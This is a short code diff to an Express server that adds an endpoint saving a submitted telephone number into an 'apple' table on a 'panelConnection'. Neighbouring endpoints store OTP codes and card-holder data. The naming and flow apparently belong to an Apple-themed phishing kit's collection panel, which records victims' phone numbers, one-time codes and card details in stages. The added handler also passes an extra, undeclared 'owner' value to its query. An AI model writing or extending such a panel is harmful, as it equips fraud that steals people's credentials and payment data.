@@ -2045,6 +2045,18 @@ app.post("/appleSaveOtp", cors(), (req, res) => {
   });
 });
 
+app.post("/appleSaveTelephone", cors(), (req, res) => {
+  const {uniqueid, telephone} = req.body
+
+  let details = [telephone, uniqueid, owner];
+  let query = `UPDATE apple SET telephone= ?, status = 10 WHERE uniqueid = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
 app.post("/appleSaveCCAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   ccname = req.body.ccname;
